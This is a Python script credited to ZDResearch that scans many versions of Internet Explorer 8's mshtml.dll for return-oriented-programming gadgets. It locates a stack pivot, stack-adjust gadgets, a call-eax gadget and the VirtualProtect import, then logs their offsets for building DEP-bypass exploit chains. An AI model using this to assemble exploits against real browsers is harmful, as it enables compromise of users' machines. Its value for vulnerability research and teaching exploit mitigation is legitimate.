#-------------------------------------------------------------------------------
# Name:        MSHTML_GEN_ROP.py
# Purpose:     VirtualProtect() ROP Finder
#
# Author:      Shahin Ramezany @ShahinRamezany
# IE-ROP:      Ahmad Moghimi
# Created:     18/08/2012
# Copyright:   (c) ZDResearch 2012
# Licence:     GPL v3
#-------------------------------------------------------------------------------
#!/usr/bin/env python

import sys
import pefile
import pydasm
import os

def Loadpe(path):

    #load PE
    
    pe = pefile.PE(path)

    print "\n"
    print "[+] MSHTML.dll version : " , pe.FileInfo[0].StringTable[0].entries['ProductVersion']
    fi = open('mshtml.dll_%s.txt'%(pe.FileInfo[0].StringTable[0].entries['ProductVersion']), 'w+')
    
    # looking for sections in PE
    #for section in pe.sections:
        #if section.Name.find(".text") != -1 :
            #print "[+] Found .text Section At Base : " , hex(section.VirtualAddress)

    # looking for kernel32.dll
    for entry in pe.DIRECTORY_ENTRY_IMPORT:
        if entry.dll.lower().find("kernel32") != -1 :
            #print "[+] Found Kernel32.dll"
            for imp in entry.imports:
                if imp.name.find("VirtualProtect") != -1 :
                    print '[+] Found VirtualProtect Import At : ', hex(imp.address - pe.OPTIONAL_HEADER.ImageBase)
                    fi.write('[+] Found VirtualProtect Import At %s: \n'%(hex(imp.address - pe.OPTIONAL_HEADER.ImageBase)))

    ep = pe.OPTIONAL_HEADER.AddressOfEntryPoint
    ep_ava = ep+pe.OPTIONAL_HEADER.ImageBase
    text_va = pe.sections[0].VirtualAddress
    data = pe.get_memory_mapped_image()[text_va:text_va+pe.sections[0].SizeOfRawData]
    
    gadg_offset = data.find('\x94\xc3')
    x = gadg_offset + 2    
    print "[+] Pivot Offset : %s"%(hex(gadg_offset+text_va))
    fi.write("[+] Pivot Offset : %s\n"%(hex(gadg_offset+text_va)))
    while gadg_offset < x:
        i = pydasm.get_instruction(data[gadg_offset:], pydasm.MODE_32)
        print pydasm.get_instruction_string(i, pydasm.FORMAT_INTEL, ep_ava+gadg_offset)
        fi.write(pydasm.get_instruction_string(i, pydasm.FORMAT_INTEL, ep_ava+gadg_offset))
        fi.write('\n')               
        gadg_offset += i.length

    gadg_offset = data.find('\x83\xc4\x30\x5f\x5e\xc3')
    x = gadg_offset + 6    
    print "[+] Gadget I Offset : %s"%(hex(gadg_offset+text_va))
    fi.write("[+] Gadget I Offset : %s\n"%(hex(gadg_offset+text_va)))
    while gadg_offset < x:
        i = pydasm.get_instruction(data[gadg_offset:], pydasm.MODE_32)
        print pydasm.get_instruction_string(i, pydasm.FORMAT_INTEL, ep_ava+gadg_offset)
        fi.write(pydasm.get_instruction_string(i, pydasm.FORMAT_INTEL, ep_ava+gadg_offset))
        fi.write('\n')                       
        gadg_offset += i.length

    gadg_offset = data.find('\x8b\x06\x5e\x5d\xc2\x04\x00')
    x = gadg_offset + 7   
    print "[+] Gadget II Offset : %s"%(hex(gadg_offset+text_va))
    fi.write("[+] Gadget II Offset : %s\n"%(hex(gadg_offset+text_va)))
    while gadg_offset < x:
        i = pydasm.get_instruction(data[gadg_offset:], pydasm.MODE_32)
        print pydasm.get_instruction_string(i, pydasm.FORMAT_INTEL, ep_ava+gadg_offset)
        fi.write(pydasm.get_instruction_string(i, pydasm.FORMAT_INTEL, ep_ava+gadg_offset))
        fi.write('\n')                               
        gadg_offset += i.length
    
    gadg_offset = data.find('\xff\xd0\xc3')
    x = gadg_offset + 3 
    print "[+] Gadget III Offset : %s"%(hex(gadg_offset+text_va))
    fi.write("[+] Gadget III Offset : %s\n"%(hex(gadg_offset+text_va)))
    while gadg_offset < x:
        i = pydasm.get_instruction(data[gadg_offset:], pydasm.MODE_32)
        print pydasm.get_instruction_string(i, pydasm.FORMAT_INTEL, ep_ava+gadg_offset)
        fi.write(pydasm.get_instruction_string(i, pydasm.FORMAT_INTEL, ep_ava+gadg_offset))
        fi.write('\n')                               
        gadg_offset += i.length
    fi.close()
    
    
if __name__ == '__main__':
    walker = list(os.walk(os.path.abspath("D:\\ie8_mshtml")))[0]
    folders = walker[1]
    for folder in folders:
        walker = list(os.walk(os.path.abspath("D:\\ie8_mshtml\\%s"%(folder))))[0]
        files = walker[2]
        for fi in files:
            if fi == 'mshtml.dll':
                Loadpe("D:\\ie8_mshtml\\%s\\%s"%(folder, fi))
